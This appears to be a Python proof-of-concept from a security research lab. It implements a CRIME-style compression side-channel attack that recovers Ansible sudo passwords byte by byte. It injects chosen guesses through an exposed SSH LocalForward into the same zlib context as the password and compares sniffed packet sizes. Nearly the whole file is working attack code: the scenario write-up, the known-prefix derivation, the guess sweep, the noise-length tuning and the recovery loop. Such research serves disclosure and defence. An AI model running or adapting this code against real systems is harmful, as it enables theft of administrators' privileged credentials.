"""CRIME-style chosen-payload attack against Ansible sudo passwords.

Scenario
--------
The victim runs ``ansible-playbook`` periodically (e.g. from cron, or as
part of a CI pipeline) and the playbook uses ``become: yes`` with the
default ``sudo`` method.  Each run:

1. spawns a fresh ``ssh`` subprocess governed by ``~/.ssh/config``,
2. opens a session channel and runs a ``sudo -S -p "..."`` exec request,
3. writes the become password to ssh's stdin after the sudo prompt
   appears, which OpenSSH wraps in a single ``SSH_MSG_CHANNEL_DATA``
   packet on the session channel.

Ansible's default ``ssh_args`` include ``-C``, so **compression is on
by default**.  The victim has a ``LocalForward`` directive in their
ssh_config that Ansible inherits automatically (for instance, a
forwarded database port the operator set up long ago and forgot
about).  That forward is reachable by an attacker on the same network
segment as the client.  Whenever the forward is listening, an Ansible
run is in progress; the attacker connects, opens a ``direct-tcpip``
channel through the live SSH connection, and injects one CRIME guess
into the same zlib compression context as the sudo password.

To keep the wire model simple, the PoC disables SSH multiplexing
(``ControlMaster=no``) in ``ansible.cfg``.  That means **each guess is
a fresh SSH connection with a fresh zlib context**, which gives us
three pleasant properties:

  * No flushing -- the LZ77 window is already empty at the start of
    every iteration, so we don't need a 33 KiB evictor step.
  * The session channel is always server-ID 0 (first and only
    channel), so the CHANNEL_DATA-header prefix matches every time.
  * Each ansible-playbook run's lifecycle is self-contained: killing
    the subprocess also releases the LocalForward binding, and the
    next iteration starts from a clean slate.

The price is that we pay an SSH handshake on every iteration.

Known prefix
------------
The bytes that precede the password in the client->server zlib stream
are the ``SSH_MSG_CHANNEL_DATA`` header of the sudo-password packet::

    \\x5e              SSH_MSG_CHANNEL_DATA  (byte 94)
    \\x00\\x00\\x00\\x00  recipient channel = 0 (first server-side channel)
    \\x00\\x00\\x00\\xLL  data length as uint32 big-endian

For passwords < 16 MB, the first three bytes of the length field are
always zero, so the first 8 bytes ``\\x5e\\x00\\x00\\x00\\x00\\x00\\x00\\x00``
are fully predictable.  The 9th byte is the sudo password length (plus
one, for the trailing ``\\n`` that Ansible appends -- see
``plugins/connection/ssh.py`` line 1300 in ansible-core).  The attack
runs in two phases:

    **Phase 1**: known prefix = ``\\x5e\\x00\\x00\\x00\\x00\\x00\\x00\\x00``
    (8 bytes).  Alphabet = plausible length bytes (``\\x01..\\x20``).
    Recovers the length byte ``\\xLL``.

    **Phase 2**: known prefix = ``\\x5e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xLL``
    (9 bytes, fully known).  Alphabet = password character set.
    Recovers the password byte-by-byte, then hits the trailing ``\\n``
    as the natural terminator.
"""

from __future__ import annotations

import asyncio
import logging
import os
import time
from typing import Any

import aiohttp

from attack import (
    CLIENT_BASE,
    LISTEN_PORT,
    _c2s_total,
    _make_noise,
    crack_byte_position,
)

LOG = logging.getLogger("attack_ansible")

CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
ANSIBLE_TUNNEL_PORT = int(os.environ.get("ANSIBLE_TUNNEL_PORT", "15432"))


async def _open_ansible_tunnel(retries: int = 20, delay: float = 0.25):
    """Open a TCP connection to the client's Ansible LocalForward port.

    This port is only listening while an ansible-playbook run is active,
    i.e. while the session channel running ``sleep 120`` is alive.  The
    ``_send_secret_ansible`` trigger in the sweep below is what keeps a
    run alive long enough for us to connect.
    """
    for attempt in range(1, retries + 1):
        try:
            return await asyncio.open_connection(CLIENT_HOST, ANSIBLE_TUNNEL_PORT)
        except (OSError, ConnectionRefusedError) as exc:
            if attempt < retries:
                LOG.warning("ansible-tunnel connect attempt %d: %s", attempt, exc)
                await asyncio.sleep(delay)
            else:
                raise
    raise RuntimeError("unreachable")


async def _trigger_ansible(session) -> None:
    """Ask the client to kick off a fresh ansible-playbook run.

    The client kills any previous run first, then spawns a new
    ``ansible-playbook`` with ``become: yes`` and waits for the
    ``Sending become_password in response to prompt`` marker before
    returning -- so when this helper returns, the sudo-password
    ``CHANNEL_DATA`` has already been written to ssh's stdin and is on
    its way across the wire.
    """
    async with session.post(f"{CLIENT_BASE}/send_secret_ansible") as r:
        body = await r.json()
        if not body.get("ok", False):
            raise RuntimeError(f"send_secret_ansible failed: {body}")


# ---------------------------------------------------------------------------
# single-round sweep (Ansible variant)
# ---------------------------------------------------------------------------

async def _sweep_round_ansible(
    session,
    packet_log,
    prefix: bytes,
    alphabet: list[bytes],
    noise_lengths: list[int],
    settle: float,
    flush_bytes: int,  # unused -- fresh zlib context per iteration
) -> tuple[dict[bytes, int], dict[int, dict[bytes, int]], int]:
    """One noise-length sweep for the Ansible variant.

    Ordering within each (candidate, noise_length) iteration:

      1. Trigger a fresh ansible-playbook run via
         ``/send_secret_ansible``.  The client kills any previous run,
         starts a new one, and blocks until the sudo password has been
         written to ssh's stdin.  When this call returns, the password
         ``CHANNEL_DATA`` is already on the wire and the LocalForward
         port is listening (the ansible ssh slave is still running the
         ``raw: sleep 2`` keepalive task).
      2. Open a TCP connection to the Ansible LocalForward port
         (CHANNEL_OPEN direct-tcpip on the ansible ssh -- its
         originator port is random per connection, contributing
         bit-alignment jitter).
      3. Settle so the CHANNEL_OPEN packets are observed by scapy.
      4. Clear the packet log (wipe the CHANNEL_OPEN from it).
      5. Write ``prefix + candidate + noise`` on the measure tunnel.
         The ansible ssh wraps this as CHANNEL_DATA on the attacker's
         direct-tcpip channel -- the same zlib context as the sudo
         password.
      6. Settle so the new CHANNEL_DATA is observed by scapy.
      7. Read the packet log, summing c->s payload bytes.
      8. Close the measure tunnel.

    There is no flush step: each iteration runs through a fresh SSH
    connection with a fresh zlib context, so there is nothing to evict.
    """
    sums: dict[bytes, int] = {c: 0 for c in alphabet}
    per_nl: dict[int, dict[bytes, int]] = {
        nl: {c: 0 for c in alphabet} for nl in noise_lengths
    }
    guesses = 0
    for noise_len in noise_lengths:
        noise = _make_noise(noise_len)
        for cb in alphabet:
            guesses += 1
            # 1. Fire ansible-playbook (kills previous, starts fresh).
            try:
                await _trigger_ansible(session)
            except Exception as exc:  # noqa: BLE001
                LOG.warning("ansible trigger failed: %s", exc)
                per_nl[noise_len][cb] = 0
                continue

            # 2. Open the measure tunnel (new direct-tcpip channel).
            try:
                _, mw = await _open_ansible_tunnel()
            except OSError as exc:
                LOG.warning(
                    "measure tunnel open failed for cand=%r nl=%d: %s",
                    cb, noise_len, exc,
                )
                per_nl[noise_len][cb] = 0
                continue

            # 3. Let CHANNEL_OPEN traffic reach the sniffer.
            if settle > 0:
                await asyncio.sleep(settle)

            # 4-7. Clear, write guess, settle, read.
            packet_log.clear()
            try:
                mw.write(prefix + cb + noise)
                await mw.drain()
            except (ConnectionResetError, BrokenPipeError, OSError) as exc:
                LOG.warning("measure write failed: %s", exc)
            if settle > 0:
                await asyncio.sleep(settle)
            measured = _c2s_total(packet_log.snapshot())
            sums[cb] += measured
            per_nl[noise_len][cb] = measured

            # 8. Close the measure tunnel.
            try:
                mw.close()
            except Exception:  # noqa: BLE001
                pass

    return sums, per_nl, guesses


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

# Phase-1 default prefix: the 8 fully-predictable bytes of the SSH
# CHANNEL_DATA header for a session-channel packet (type 0x5e + recipient
# channel 0 + first 3 bytes of the uint32 length field).  The ninth byte
# is the password length, which Phase 1 recovers.
DEFAULT_KNOWN_PREFIX = b"\x5e\x00\x00\x00\x00\x00\x00\x00"


def _find_significant_noise(
    per_nl: dict[int, dict[bytes, int]],
    best: bytes,
) -> tuple[int | None, int]:
    """Given a single round's per-noise-length per-candidate sums,
    return ``(noise_length, gap)`` where *noise_length* is the noise
    index at which the best candidate is strictly cheaper than every
    other candidate and *gap* is how much cheaper (in wire bytes).

    With a fresh SSH connection per iteration the Ansible variant's
    signal is remarkably clean: at exactly one noise length per byte
    position, the 1-byte LZ77-match advantage crosses a
    chacha20-poly1305 8-byte padding boundary, so the correct
    candidate measures exactly 8 wire-bytes less than every wrong
    candidate.  At the other 7 noise lengths, correct and wrong are
    bit-for-bit identical on the wire and contribute no gap.  This
    helper just picks the noise index with the largest
    ``min(others) - best`` gap; if no noise length shows any gap,
    ``(None, 0)`` is returned.
    """
    best_gap = 0
    sig_nl: int | None = None
    for nl, vals in per_nl.items():
        if best not in vals:
            continue
        best_val = vals[best]
        others = [v for c, v in vals.items() if c != best]
        if not others:
            continue
        gap = min(others) - best_val
        if gap > best_gap:
            best_gap = gap
            sig_nl = nl
    return sig_nl, best_gap


async def run_attack(
    packet_log,
    known_prefix: bytes = DEFAULT_KNOWN_PREFIX,
    alphabet_str: str = "abcdefghijklmnopqrstuvwxyz0123456789",
    max_length: int = 32,
    noise_lengths: list[int] | None = None,
    terminator: bytes = b"\n",
    settle: float = 0.1,
    min_margin: int = 8,
    max_rounds: int = 96,
    flush_bytes: int = 0,  # fresh zlib context per guess, no flush
    noise_hints: list[int] | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """Run the Ansible-model attack.

    The default ``known_prefix`` is the 8-byte CHANNEL_DATA header
    before the password length byte.  The attack is normally driven in
    two phases by ``test_attack_ansible.py``:

    * Phase 1: ``known_prefix = \\x5e\\x00\\x00\\x00\\x00\\x00\\x00\\x00``,
      ``max_length=1``, alphabet = plausible length bytes, recovers the
      password length byte.
    * Phase 2: ``known_prefix = <phase-1 prefix> + <length byte>``,
      alphabet = password character set, recovers the password.

    Adaptive noise is turned off because each iteration runs in a fresh
    zlib context: the per-round "productive noise lengths" signal that
    the direct variant uses doesn't generalise across connections.  In
    practice the fresh-connection model produces a remarkably clean
    signal -- no flush residue, no previous-guess back-references, and
    the session-channel-header prefix is an exact match -- so the
    default ``min_margin`` can be as low as 8 (half the direct
    variant's 16).  The ``settle=0.1`` default is on the high side
    because the scapy sniffer occasionally drops a single late packet
    when the per-iteration cadence gets fast enough, which shifts the
    candidate-sum parity by ``20 mod 8 = 4`` -- not enough to change
    the ranking under ``min_margin=8`` but enough to produce
    impossible-looking margins in the round log.

    Significant-noise observation and optional per-position hints
    -------------------------------------------------------------
    After every recovered byte the attack analyses the per-noise
    per-candidate sums from the last round and logs which noise
    length carried the 8-byte signal (the "significant" noise
    length).  This is observation-only in the default configuration
    and has no effect on the attack's decisions.  The observed
    significant noise lengths are also returned in
    ``significant_noises`` so the caller can harvest them.

    Optionally, ``noise_hints`` may be a list of per-position noise
    indices: for byte position ``i < len(noise_hints)`` the attack
    probes only the single noise length ``noise_hints[i]`` instead
    of running the full 8-noise sweep, giving an ~8x speedup per
    hinted position.  Positions at or beyond ``len(noise_hints)``
    fall back to the full 8-noise sweep automatically.  By default
    (``noise_hints=None``) every byte probes all 8 noise lengths.
    """
    if noise_lengths is None:
        noise_lengths = list(range(8))
    alphabet = [bytes([c]) for c in alphabet_str.encode("utf-8")]
    if terminator not in alphabet:
        alphabet.append(terminator)

    LOG.info(
        "starting ansible attack: known_prefix=%r alphabet_size=%d "
        "noise_lengths=%s settle=%.3f min_margin=%d max_rounds=%d "
        "noise_hints=%s",
        known_prefix, len(alphabet), noise_lengths, settle,
        min_margin, max_rounds, noise_hints,
    )

    # Closure that wraps _sweep_round_ansible and captures the latest
    # round's per-noise-length per-candidate sums, so that after each
    # position we can figure out which noise length carried the
    # 8-byte signal and log it.
    latest_per_nl: dict[int, dict[bytes, int]] = {}

    async def capturing_sweep(
        session, packet_log_, prefix, alphabet_, noise_lens_, settle_, flush_bytes_,
    ):
        sums, per_nl, guesses = await _sweep_round_ansible(
            session, packet_log_, prefix, alphabet_, noise_lens_, settle_, flush_bytes_,
        )
        latest_per_nl.clear()
        latest_per_nl.update(per_nl)
        return sums, per_nl, guesses

    started = time.time()
    recovered = b""
    history: list[dict[str, Any]] = []
    per_position_guesses: list[int] = []
    significant_noises: list[int | None] = []

    timeout = aiohttp.ClientTimeout(total=7200)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for pos in range(max_length):
            # Constant-length prefix trimming: keep len(prefix+candidate)
            # constant across positions so LZ77 match lengths stay in
            # the same DEFLATE length-code bin.
            full_prefix = known_prefix + recovered
            trim = max(0, len(full_prefix) - len(known_prefix))
            full_prefix = full_prefix[trim:]

            # Pick noise lengths for this position: if the caller
            # supplied a per-position hint and we're still within
            # the hint array, probe *only* that single noise length;
            # otherwise fall back to the full 8-noise sweep.
            if noise_hints is not None and pos < len(noise_hints):
                pos_noise = [int(noise_hints[pos])]
                LOG.info("pos %2d: single-noise sweep at nl=%d (hint)",
                         pos, pos_noise[0])
            else:
                pos_noise = list(noise_lengths)
                LOG.info("pos %2d: full noise sweep", pos)

            best, sums, _, pos_guesses = await crack_byte_position(
                session, packet_log,
                prefix=full_prefix,
                alphabet=alphabet,
                noise_lengths=pos_noise,
                settle=settle,
                flush_bytes=flush_bytes,
                min_margin=min_margin,
                max_rounds=max_rounds,
                log_prefix=f"pos {pos:2d}",
                sweep_fn=capturing_sweep,
                adaptive_noise=False,
            )
            per_position_guesses.append(pos_guesses)

            # Observation: which noise length actually carried the
            # 8-byte signal this position?  Always logged, even in
            # hinted single-noise mode (where it's trivially the one
            # we probed), so the caller can see the `(sig + pos) mod
            # 8` pattern roll across positions and fill a future
            # `noise_hints` array from the observed values.
            if best != terminator:
                sig_nl, sig_gap = _find_significant_noise(latest_per_nl, best)
                if sig_nl is not None:
                    LOG.info(
                        "pos %2d: significant noise length = %d (gap=%d wire bytes)",
                        pos, sig_nl, sig_gap,
                    )
                else:
                    LOG.info(
                        "pos %2d: no significant noise length detected "
                        "(all noise lengths equal)", pos,
                    )
                significant_noises.append(sig_nl)
            else:
                significant_noises.append(None)

            ranked = [
                (k.decode("latin-1"), v)
                for k, v in sorted(sums.items(), key=lambda kv: kv[1])
            ]
            history.append({
                "position": pos,
                "best": best.decode("latin-1"),
                "ranked": ranked[:6],
                "noise_lengths": pos_noise,
                "guesses": pos_guesses,
            })
            if best == terminator:
                LOG.info("hit terminator at position %d -> done", pos)
                break
            recovered += best
            LOG.info("recovered so far: %r",
                     recovered.decode("latin-1"))
        else:
            LOG.warning("hit max_length=%d without terminator", max_length)

    elapsed = time.time() - started
    LOG.info("ansible attack done in %.1fs: recovered=%r",
             elapsed, recovered.decode("latin-1"))

    return {
        "recovered": recovered.decode("latin-1"),
        "elapsed_seconds": elapsed,
        "history": history,
        # The significant noise length observed at each position,
        # in order.  A list of ints (or None for positions where no
        # clear signal was visible, e.g. the terminator position).
        # Callers can harvest this and feed it back as `noise_hints`
        # on a subsequent attack run to skip the 8-noise sweep.
        "significant_noises": significant_noises,
        "total_guesses": sum(per_position_guesses),
        "per_position_guesses": per_position_guesses,
    }
